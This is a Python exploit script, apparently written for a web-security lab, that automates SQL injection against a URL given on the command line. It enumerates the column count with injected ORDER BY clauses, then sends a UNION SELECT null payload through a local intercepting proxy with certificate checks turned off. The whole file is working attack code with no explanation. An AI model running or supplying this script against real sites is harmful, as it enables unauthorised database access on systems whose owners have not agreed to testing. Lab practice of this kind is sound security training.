import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}

def exploit_orderby(url):
    for i in range(1,10):
        r = requests.get(url + f"'+ORDER+BY+{i}--", verify=False, proxies=proxies)
        if r.status_code == 200:
            print(f'{i} ORDER BY successful')
        else:
            print(f'{i} ORDER BY unsuccessful')
            columns = i -1
            print(f'Columns:{columns}')
            break
    return (columns)

def exploit_union(url,num_columns):
    print(f'Number of columns: {num_columns}')
    payload = "'UNION+SELECT"
    for i in range(0,num_columns):
        if i > 0:
            payload = payload + ','
        payload = payload + '+null'
    payload = payload + '--'
    print(f'Payload deliverd: {payload}')
    r = requests.get(url + payload, verify=False, proxies=proxies)
    if 'null' in r.text:
        print('[+] Exploit was successful')
    else:
        print('[-] Exploit not successful')
        
if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()  
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url>')
        print(f'[-] Example: {sys.argv[0]} www.example.com')
        sys.exit(-1)
    
    print('Running ORDER BY exploit')
    num_columns = exploit_orderby(url)
    print('Running UNION exploit')
    exploit_union(url,num_columns)
